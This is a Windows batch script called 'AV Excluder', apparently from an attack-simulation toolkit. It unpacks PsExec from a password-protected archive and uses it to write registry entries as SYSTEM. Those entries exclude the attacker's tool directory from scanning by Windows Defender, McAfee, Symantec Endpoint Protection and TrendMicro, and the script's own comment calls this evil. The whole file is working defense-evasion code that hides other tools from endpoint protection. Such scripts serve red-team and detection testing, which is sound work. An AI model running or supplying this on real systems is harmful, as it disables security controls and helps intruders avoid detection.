@ECHO OFF
@setlocal EnableDelayedExpansion

ECHO ===========================================================================
ECHO AV Excluder
ECHO.
ECHO We add exclusions for Antivirus products in the local registry
ECHO I know this is evil but hey, we are attackers with admin rights and not malware, right?
ping -n 3 127.0.0.1 > NUL

ECHO Extracting PsExec, which is used to swith into LOCAL_SYSTEM context
"%ZIP%" e -p%PASS% %TOOLARCH% -aoa -o"%APTDIR%" toolset\p.exe > NUL
ping -n 2 127.0.0.1 > NUL

ECHO ===========================================================================
ECHO Excluding %APTDIR% for Windows Defender
"%APTDIR%\p.exe" -accepteula -d -s cmd.exe /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v %APTDIR% /t REG_DWORD /d 0 /f

ping -n 3 127.0.0.1 > NUL

ECHO ===========================================================================
ECHO Excluding %APTDIR% for McAfee OnAccess Scanner

FOR /f "tokens=3 delims= " %%a in ('reg query "HKLM\SOFTWARE\Wow6432Node\McAfee\SystemCore\VSCore\On Access Scanner\McShield\Configuration\Default" /v NumExcludeItems') DO set num=%%a
SET /a NEWNUM=%num%
SET /a NEWNUM+=1
SET NewExcludeItem=ExcludedItem_%NEWNUM%

ECHO Adding new exclude item ...
"%APTDIR%\p.exe" -accepteula -d -s cmd.exe /c REG ADD  "HKLM\SOFTWARE\Wow6432Node\McAfee\SystemCore\VSCore\On Access Scanner\McShield\Configuration\Default" /v %NewExcludeItem% /t REG_SZ /d "3|15|%APTDIR%\*" /f
ECHO Updating number of exclude items ...
"%APTDIR%\p.exe" -accepteula -d -s cmd.exe /c REG ADD "HKLM\SOFTWARE\Wow6432Node\McAfee\SystemCore\VSCore\On Access Scanner\McShield\Configuration\Default" /v NumExcludeItems /t REG_DWORD /d %NEWNUM% /f

ping -n 3 127.0.0.1 > NUL

ECHO ===========================================================================
ECHO Excluding %APTDIR% for Symantect Endpoint Protection
ping -n 3 127.0.0.1 > NUL

"%APTDIR%\p.exe" -accepteula -d -s cmd.exe /c REG ADD "HKLM\\SOFTWARE\Wow6432Node\Symantec\Symantec Endpoint Protection\AV\Exclusions\Domain Controller"
"%APTDIR%\p.exe" -accepteula -d -s cmd.exe /c REG ADD "HKLM\\SOFTWARE\Wow6432Node\Symantec\Symantec Endpoint Protection\AV\Exclusions\Domain Controller\NoScanDir" /v %APTDIR% /t REG_DWORD /d 1 /f

ping -n 3 127.0.0.1 > NUL

ECHO ===========================================================================
ECHO Excluding %APTDIR% for TrendMicro
:: Reference: http://www.users.on.net/~lynmik/CSTECH/ATF/TrendExclusion.reg
::            https://twitter.com/0xAbd0/status/967441690821906432
ping -n 3 127.0.0.1 > NUL

"%APTDIR%\p.exe" -accepteula -d -s cmd.exe /c REG ADD "HKLM\\SOFTWARE\TrendMicro\UniClient\1700\Scan\Exceptions\0" /v %APTDIR% /t REG_DWORD /d 1 /f

ping -n 3 127.0.0.1 > NUL
